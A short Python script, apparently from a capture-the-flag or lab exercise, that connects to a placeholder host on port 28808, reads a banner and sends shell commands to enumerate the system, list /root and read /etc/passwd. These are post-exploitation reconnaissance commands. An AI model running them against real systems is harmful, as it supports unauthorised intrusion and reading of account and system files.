import socket,time
s=socket.create_connection(("<host>",28808),timeout=15)
s.settimeout(3)
def rd(t=3):
    s.settimeout(t); b=b""
    try:
        while True:
            c=s.recv(65536)
            if not c: break
            b+=c
    except Exception: pass
    return b
print("BANNER:",rd(5)[:2000])
s.sendall(b"id; uname -a; cat /proc/version; ls -la /; ls -la /root 2>&1; cat /etc/passwd\n")
time.sleep(2)
print("OUT:",rd(5)[:4000])
s.close()
